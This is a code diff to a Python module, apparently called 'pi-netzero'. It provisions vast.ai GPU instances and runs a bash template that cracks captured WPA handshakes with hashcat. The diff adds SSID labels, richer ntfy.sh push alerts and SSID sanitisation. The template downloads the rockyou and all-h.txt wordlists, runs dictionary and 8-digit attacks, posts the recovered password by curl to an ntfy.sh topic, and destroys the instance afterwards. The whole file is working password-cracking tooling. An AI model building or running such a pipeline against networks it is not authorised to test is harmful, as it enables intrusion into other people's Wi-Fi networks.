@@ -62,12 +62,12 @@ def find_offer():
     return offers[0]
 
 
-def launch(label, hc22000):
+def launch(label, hc22000, ssid="network"):
     """Provision a crack instance. Returns {instance_id, dph, gpu}."""
     offer = find_offer()
     body = {
         "client_id": "me", "image": CRACK_IMAGE, "disk": CRACK_DISK_GB,
-        "onstart": _onstart(label, hc22000), "runtype": "ssh", "label": label,
+        "onstart": _onstart(label, hc22000, ssid), "runtype": "ssh", "label": label,
     }
     res = _req("PUT", f"/asks/{offer['id']}/", body=body)
     if not res.get("success"):
@@ -110,15 +110,16 @@ def progress():
 
 _TEMPLATE = r"""#!/bin/bash
 exec > /workspace/crack.log 2>&1; set -x
-TOPIC="__TOPIC__"; LABEL="__LABEL__"; KEY="__KEY__"
-notify(){ curl -s -H "Title: pi-netzero" -d "$1" "https://ntfy.sh/$TOPIC" >/dev/null 2>&1 || true; }
+TOPIC="__TOPIC__"; LABEL="__LABEL__"; KEY="__KEY__"; SSID="__SSID__"
+# alert <body> [title] [priority] [tags] -> friendly push to the user's topic
+alert(){ curl -s -H "Title: ${2:-pi-netzero}" -H "Priority: ${3:-default}" -H "Tags: ${4:-satellite}" -d "$1" "https://ntfy.sh/$TOPIC" >/dev/null 2>&1 || true; }
 selfdestruct(){
   ID=$(curl -s "https://console.vast.ai/api/v0/instances/?owner=me&api_key=$KEY" \
     | python3 -c "import sys,json;print(next((str(i['id']) for i in json.load(sys.stdin).get('instances',[]) if i.get('label')=='$LABEL'),''))" 2>/dev/null)
   [ -n "$ID" ] && curl -s -X DELETE "https://console.vast.ai/api/v0/instances/$ID/?api_key=$KEY" >/dev/null 2>&1
   sleep 5; shutdown -h now 2>/dev/null || kill 1
 }
-( sleep __MAXSEC__; notify "time limit reached, stopping: $LABEL"; selfdestruct ) &
+( sleep __MAXSEC__; alert "\"$SSID\" — stopped at the 3h time limit" "pi-netzero" default hourglass; selfdestruct ) &
 
 # Progress reporter: publishes "<label>|<stage> · NN%" to the quiet <topic>-status
 # topic every 15s. The Pi polls that topic to show live stage + % in the UI.
@@ -137,7 +138,7 @@ setstage(){ echo "$1" > /workspace/STAGE; echo "$2" > /workspace/CURLOG; }
     sleep 15
   done ) &
 
-notify "crack started: $LABEL"
+alert "Cracking \"$SSID\" · rockyou → 8-digit → all-h.txt" "pi-netzero" default rocket
 export DEBIAN_FRONTEND=noninteractive
 setstage "installing tools" ""
 apt-get update -qq && apt-get install -y hashcat aria2 p7zip-full curl python3 >/dev/null 2>&1
@@ -147,7 +148,7 @@ __HASH__
 HCEOF
 POT=/workspace/cracked.pot
 check(){ hashcat -m 22000 target.hc22000 --show --potfile-path "$POT" 2>/dev/null > RESULT.txt; [ -s RESULT.txt ]; }
-finish(){ PW=$(awk -F: '{print $NF}' RESULT.txt | sort -u | paste -sd" "); notify "CRACKED $LABEL : $PW"; setstage "cracked: $PW" ""; sleep 20; selfdestruct; exit 0; }
+finish(){ PW=$(awk -F: '{print $NF}' RESULT.txt | sort -u | paste -sd" "); alert "Password: $PW" "CRACKED $SSID" high unlock; setstage "cracked: $PW" ""; sleep 20; selfdestruct; exit 0; }
 
 setstage "downloading rockyou" ""
 curl -sL -o rockyou.txt "__ROCKYOU__"
@@ -165,16 +166,19 @@ ARCHIVE=$(ls /workspace/*.7z 2>/dev/null | head -1)
 setstage "cracking all-h.txt" /workspace/hc3.log
 7z e -so "$ARCHIVE" 2>/dev/null | hashcat -m 22000 -a 0 -O target.hc22000 --status --status-timer 10 --potfile-path "$POT" > /workspace/hc3.log 2>&1
 check && finish
-notify "not cracked: $LABEL (all lists exhausted)"; setstage "exhausted - not found" ""
+alert "\"$SSID\" — not cracked (rockyou + 8-digit + all-h.txt exhausted)" "pi-netzero" default x
+setstage "exhausted - not found" ""
 sleep 22; selfdestruct
 """
 
 
-def _onstart(label, hc22000):
+def _onstart(label, hc22000, ssid="network"):
+    safe_ssid = "".join(c for c in (ssid or "network") if c not in '"`\\$') or "network"
     return (_TEMPLATE
             .replace("__TOPIC__", NTFY_TOPIC)
             .replace("__LABEL__", label)
             .replace("__KEY__", VAST_API_KEY)
+            .replace("__SSID__", safe_ssid)
             .replace("__MAXSEC__", str(int(CRACK_MAX_HOURS * 3600)))
             .replace("__ROCKYOU__", ROCKYOU_URL)
             .replace("__TORRENT__", ALL_H_TORRENT)
